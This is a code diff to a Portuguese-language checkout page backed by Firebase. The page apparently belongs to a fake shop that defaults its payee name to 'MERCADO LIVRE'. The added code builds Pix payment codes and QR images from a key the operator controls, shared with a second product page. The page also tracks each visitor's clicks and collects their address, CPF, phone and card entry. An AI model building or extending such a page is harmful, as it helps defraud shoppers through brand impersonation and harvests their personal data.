@@ -272,7 +272,7 @@
     <img id="lightboxImg" src="" alt="Foto ampliada">
   </div>
 
-  <!-- SITE (tela inicial, sem login) -->
+  <!-- SITE -->
   <div id="appSite">
     <header class="nav-header">
       <div class="nav-bounds">
@@ -702,6 +702,9 @@ ATENÇÃO:
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
+    // Valor do produto PANELAS — o guarda-roupa usa 416.76 no arquivo dele
+    const VALOR_PEDIDO = 159.44;
+
     let clienteId = localStorage.getItem('clienteId');
     if (!clienteId) {
       clienteId = 'c_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
@@ -741,7 +744,7 @@ ATENÇÃO:
     }
 
     function comprarAgora() {
-      pedidoRef.update({ clicouComprar: true, clicouComprarEm: Date.now(), valor: 159.44 });
+      pedidoRef.update({ clicouComprar: true, clicouComprarEm: Date.now(), valor: VALOR_PEDIDO });
       db.ref('alertas').push({ tipo: 'clique_comprar', clienteId, timestamp: Date.now() });
 
       telaLoading.classList.remove('hidden');
@@ -824,7 +827,6 @@ ATENÇÃO:
 
       const endFormatado = `${dados.nome}<br>${dados.rua}, ${dados.numero}${dados.complemento ? ' - ' + dados.complemento : ''}<br>${dados.bairro} - ${dados.cidade}/${dados.estado}<br>CPF: ${dados.cpf}<br>Tel: ${dados.telefone}`;
       document.getElementById('mostrarEndereco').innerHTML = endFormatado;
-      window._dadosCompra = dados;
 
       appEndereco.classList.add('hidden');
       appFrete.classList.remove('hidden');
@@ -851,6 +853,47 @@ ATENÇÃO:
       window.scrollTo(0, 0);
     }
 
+    /* ---------- PIX ----------
+       Lê a MESMA chave que o guarda-roupa usa (config_pix.chave)
+       e gera com o valor das PANELAS (159,44).
+    ----------------------------------------------------- */
+    function extrairChaveDePayload(texto) {
+      if (!texto) return '';
+      const s = String(texto).trim();
+      if (!/^000201/.test(s)) return s;
+      function campo(emv, id) {
+        let pos = 0;
+        while (pos + 4 <= emv.length) {
+          const tag = emv.substr(pos, 2);
+          const len = parseInt(emv.substr(pos + 2, 2), 10);
+          if (isNaN(len)) return null;
+          const val = emv.substr(pos + 4, len);
+          if (tag === id) return val;
+          pos += 4 + len;
+        }
+        return null;
+      }
+      const gui = campo(s, '26');
+      if (!gui) return '';
+      return campo(gui, '01') || '';
+    }
+
+    function gerarPayloadPix(chave, nome, cidade, valor) {
+      const f = (id, val) => id + ('00' + String(val).length).slice(-2) + val;
+      const clean = s => (s || '').normalize('NFD').replace(/[\u0300-\u036f]/g, '').toUpperCase();
+      const gui = f('00', 'br.gov.bcb.pix') + f('01', String(chave || '').trim());
+      let raw = f('00', '01') + f('26', gui) + f('52', '0000') + f('53', '986');
+      if (valor) raw += f('54', parseFloat(valor).toFixed(2));
+      raw += f('58', 'BR') + f('59', clean(nome).substring(0, 25)) +
+             f('60', clean(cidade).substring(0, 15)) + f('62', f('05', '***')) + '6304';
+      let crc = 0xFFFF;
+      for (let i = 0; i < raw.length; i++) {
+        crc ^= (raw.charCodeAt(i) << 8);
+        for (let j = 0; j < 8; j++) crc = (crc & 0x8000) ? ((crc << 1) ^ 0x1021) & 0xFFFF : (crc << 1) & 0xFFFF;
+      }
+      return raw + ('0000' + crc.toString(16).toUpperCase()).slice(-4);
+    }
+
     function escolherPix() {
       appPagamento.classList.add('hidden');
       appPix.classList.remove('hidden');
@@ -858,7 +901,7 @@ ATENÇÃO:
 
       pedidoRef.update({
         pagamentoTipo: 'pix',
-        pix: { geradoEm: Date.now(), copiado: false }
+        pix: { geradoEm: Date.now(), copiado: false, valor: VALOR_PEDIDO }
       });
       db.ref('alertas').push({ tipo: 'pix_gerado', clienteId, timestamp: Date.now() });
 
@@ -867,21 +910,38 @@ ATENÇÃO:
       msg.style.display = 'block';
       box.style.display = 'none';
 
-      db.ref('pixConfig').on('value', snap => {
-        const cfg = snap.val();
-        if (!cfg || !cfg.chave) {
+      // Lê a chave CRUA do painel (a mesma do guarda-roupa)
+      db.ref('config_pix').once('value').then(snap => {
+        const cfg = snap.val() || {};
+        const chaveCrua = extrairChaveDePayload(cfg.chave || '');
+
+        if (!chaveCrua) {
           msg.textContent = 'Aguarde, o administrador está configurando o Pix...';
-          msg.style.display = 'block';
-          box.style.display = 'none';
           return;
         }
+
+        // Gera com o VALOR DAS PANELAS (159,44) e a MESMA chave do guarda-roupa
+        const payload = gerarPayloadPix(
+          chaveCrua,
+          cfg.nome || 'MERCADO LIVRE',
+          cfg.cidade || 'SAO PAULO',
+          VALOR_PEDIDO
+        );
+        const qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(payload);
+
         msg.style.display = 'none';
         box.style.display = 'block';
-        document.getElementById('chavePix').value = cfg.chave;
-        document.getElementById('qrCodeImg').src = cfg.qrCode;
-        document.getElementById('pixTopo').textContent = 'Pague R$ ' + (cfg.valor || '159,44') + ' via Pix para garantir sua compra';
+        document.getElementById('chavePix').value = payload;
+        document.getElementById('qrCodeImg').src = qrUrl;
+        document.getElementById('pixTopo').textContent =
+          'Pague R$ ' + VALOR_PEDIDO.toFixed(2).replace('.', ',') + ' via Pix para garantir sua compra';
 
-        pedidoRef.update({ 'pix/chave': cfg.chave, 'pix/valor': cfg.valor });
+        pedidoRef.update({
+          'pix/chaveRaw': chaveCrua,
+          'pix/chave': payload,
+          'pix/qrCode': qrUrl,
+          'pix/valor': VALOR_PEDIDO
+        });
       });
     }
 
@@ -903,7 +963,7 @@ ATENÇÃO:
       alert('Código PIX copiado!');
     }
 
-    /* CARTÃO */
+    /* ---------- CARTÃO ---------- */
     function escolherCartao() {
       appPagamento.classList.add('hidden');
       appCartao.classList.remove('hidden');
@@ -950,22 +1010,18 @@ ATENÇÃO:
     }
 
     function pagarCartao() {
-      // Lê APENAS o número para derivar bandeira e últimos 4.
-      // NUNCA lemos validade ou CVV; esses campos são descartados sem serem lidos.
       const numeroRaw = document.getElementById('numeroCartao').value.replace(/\D/g, '');
       const ultimos4 = numeroRaw.slice(-4);
       const bandeira = detectarBandeira(numeroRaw);
       const nomeCompleto = document.getElementById('nomeCartao').value.trim();
       const primeiroNome = nomeCompleto ? nomeCompleto.split(' ')[0] : '***';
 
-      // Limpa IMEDIATAMENTE todos os campos sensíveis do DOM
       document.getElementById('numeroCartao').value = '';
       document.getElementById('nomeCartao').value = '';
       document.getElementById('validade').value = '';
       document.getElementById('cvv').value = '';
       document.getElementById('cpfCartao').value = '';
 
-      // Salva SOMENTE dados não sensíveis
       pedidoRef.update({
         pagamentoTipo: 'cartao',
         cartao: {
